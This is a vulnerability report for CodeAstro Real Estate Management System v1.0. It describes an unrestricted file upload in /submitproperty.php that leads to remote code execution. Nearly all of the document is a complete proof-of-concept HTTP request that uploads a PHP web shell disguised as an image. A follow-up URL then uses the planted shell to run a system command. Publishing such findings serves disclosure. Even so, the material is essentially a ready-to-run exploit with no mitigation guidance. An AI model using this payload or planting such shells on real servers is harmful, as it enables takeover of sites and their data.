# Unauthorized File Upload to RCE in CodeAstro Real Estate Management System v1.0 of file /submitproperty.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- submitproperty.php

**Version**

- V1.0

### POC 

/submitproperty.php File Upload to RCE


```http
POST /submitproperty.php HTTP/1.1
Host: www.realestate1.top
Cookie: PHPSESSID=29il4v1ositshrfe7un295114t
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="title"

Test Property
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="content"

Test content
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="ptype"

apartment
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="bhk"

1 BHK
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="bed"

1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="balc"

1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="hall"

1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="stype"

rent
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="bath"

1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="kitc"

1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="floor"

1st Floor
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="price"

100000
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="city"

Test City
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="asize"

1000
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="loc"

Test Location
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="state"

Test State
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="status"

available
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="feature"

Test features
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="totalfl"

1 Floor
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="isFeatured"

0
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="aimage"; filename="shell2.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="aimage1"; filename="test1.jpg"
Content-Type: image/jpeg

fake_image_data
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="aimage2"; filename="test2.jpg"
Content-Type: image/jpeg

fake_image_data
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="aimage3"; filename="test3.jpg"
Content-Type: image/jpeg

fake_image_data
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="aimage4"; filename="test4.jpg"
Content-Type: image/jpeg

fake_image_data
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="fimage"; filename="floor.jpg"
Content-Type: image/jpeg

fake_image_data
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="fimage1"; filename="floor1.jpg"
Content-Type: image/jpeg

fake_image_data
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="fimage2"; filename="floor2.jpg"
Content-Type: image/jpeg

fake_image_data
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="add"

Submit Property
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

![image-20250817162418197](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508171624304.png)

```
http://www.realestate1.top/admin/property/shell2.php?cmd=id
```

![image-20250817162508956](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508171625079.png)